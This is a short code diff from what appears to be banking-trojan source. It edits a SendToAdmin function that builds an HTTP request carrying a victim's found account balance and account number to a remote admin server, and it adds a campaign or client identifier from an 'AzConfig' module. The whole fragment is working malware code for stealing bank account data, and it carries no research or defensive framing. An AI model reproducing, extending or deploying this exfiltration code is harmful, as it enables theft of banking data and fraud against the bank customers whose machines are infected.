@@ -14,6 +14,7 @@
 #include "BotHTTP.h"
 #include "Config.h"
 #include "rafa.h"
+#include "AzConfig.h"
 
 #include "BotDebug.h"
 
@@ -2251,7 +2252,8 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 			pwsprintfA( accs.str(), "sum=%s&acc=%s", findedBalans[0].balans, findedBalans[0].acc );
 		//формируем запрос
 		GenerateUid(uid.str());
-		wsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&mode=%s&%s", urlAdmin, uid, mode, accs.str() );
+		string azUser = GetAzUser();
+		wsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&cid=%s&mode=%s&%s", urlAdmin, uid, azUser.t_str(), mode, accs.str() );
 		//отправляем запрос
 		THTTPResponseRec Response;
 		ClearStruct(Response);
